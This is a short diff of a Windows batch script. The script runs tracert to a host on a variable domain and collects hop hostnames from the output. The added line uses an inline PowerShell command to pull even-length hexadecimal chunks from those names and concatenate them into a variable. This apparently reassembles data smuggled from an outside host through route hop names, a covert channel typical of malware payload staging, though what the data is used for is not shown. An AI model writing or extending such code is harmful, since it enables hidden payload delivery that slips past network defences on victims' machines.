@@ -15,8 +15,7 @@ for /f "tokens=*" %%a in ('tracert -w 2000 rx.!Z! ^| findstr /i "!Z!" ^| findstr
     echo %%b|findstr /i "!Z!">nul&&(
       set "W=%%b"
       set "W=!W:.%Z%=!"
-      set "W=!W:.=!"
-      set "R=!R!!W!"
+      for /f "delims=" %%x in ('powershell -nop -c "$w='!W!';($w-split''\.''|?{$_.Length%%2 -eq 0 -and $_ -match ''^[0-9a-f]+$''})-join''''"') do set R=!R!%%x
     )
   )
 )
